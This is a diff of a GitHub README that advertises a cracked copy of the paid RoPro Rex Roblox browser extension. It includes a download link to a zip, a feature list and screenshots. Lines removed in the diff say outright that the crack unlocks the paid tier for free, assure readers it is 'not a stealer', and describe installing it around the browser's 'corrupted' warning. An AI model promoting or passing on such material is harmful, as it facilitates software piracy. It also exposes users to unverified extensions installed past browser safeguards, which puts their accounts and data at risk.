@@ -1,18 +1,75 @@
-# RoPro-Cracked
+<h1 align="center">
+   RoProRex
+</h1>
+<p align= "center">
+   <kbd>
+   <img  src="https://github.com/kss342/RoProRex/assets/111409284/5fa39681-b1f9-4754-acdb-10ac37cc1758">
+   </kbd><br><br>
+   <img src="https://img.shields.io/github/languages/top/kss342/RoProRex">
+   <img src="https://img.shields.io/github/stars/kss342/RoProRex">
+   <img src="https://img.shields.io/github/forks/kss342/RoProRex">
+   <br>
+   <img src="https://img.shields.io/github/last-commit/kss342/RoProRex">
+   <img src="https://img.shields.io/github/license/kss342/RoProRex">
+   <br>
+   <img src="https://img.shields.io/github/issues/kss342/RoProRex">
+   <img src="https://img.shields.io/github/issues-closed/kss342/RoProRex">
+   <br>
+   <br>
+</p>
+<p align= "center">
+    If u like this project, would you kindly star this?
 
-This file is a cracked version of RoPro rex which is 8 dollars a month
+</p>
+   
+## Table of Contents
 
-This is not a stealer of any sort. You can view all of the code on here and see that it is safe. If you have any issues / features not working, please contact me on discord (finallfantasy)
+- [Download](#download)
+- [Features](#features)
+- [How to Install?](#how-to-install)
 
-![Ekran görüntüsü 2024-04-28 093037](https://github.com/kss342/RoProRex-cracked/assets/111409284/8c28c93a-ce84-4479-a4bd-de71738f7e18)
+## Download
 
-This allows you to have pro tier for free
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/kss342/RoProRex-Cracked/raw/main/Rex.zip)
 
-![Ekran görüntüsü 2024-04-28 093141](https://github.com/kss342/RoProRex-cracked/assets/111409284/2b62c3f2-b7a4-441d-99dc-55b41ccb4feb)
+## Features
 
-### Installing
+    • Trade loss/win preview.
+    • Server region locator.
+    • Best stable ping server filters.
+    • Profile themes.
+    • Trade Notifier.
+    • Trade protection.
+    • Trade cancel treshold.
+    • More mutuals on friends page.
+    • Live experience like, dislike, and favorite counters.
+    • More server filters (region, connection, uptime).
+    • View server region, version, and uptime.
+    • Embedded links to Rolimons user pages.
+    • Embedded links to Rolimons item pages.
+    • Open source.
+    (...more)
 
-*this should get around Chrome/Brave's "corrupted" message*
+**Supports:** All Browsers.*
+# Images
+<p align= "center">
+   <kbd>
+   <img  src="https://github.com/kss342/RoProRex/assets/111409284/d5d99284-99e7-4b8c-bbd3-ebcdb1aae2ff">
+   </kbd><br><br>
+   <p align= "center">
+   <kbd>
+   <img  src="https://github.com/kss342/RoProRex/assets/111409284/6ca46f13-bf0c-4e85-b0b6-e7f0cf902e67">
+   </kbd><br><br>
+   <p align= "center">
+   <kbd>
+   <img  src="https://github.com/kss342/RoProRex/assets/111409284/5879e600-fd10-4686-b18f-ece6eec59f4e">
+   </kbd><br><br>
+
+   <p align= "center">
+
+   </kbd><br><br>
+
+## How to install?
 
 - Download the [RoPro](https://github.com/kss342/RoProRex-Cracked/raw/main/Rex.zip)
 - Open the extension we downloaded
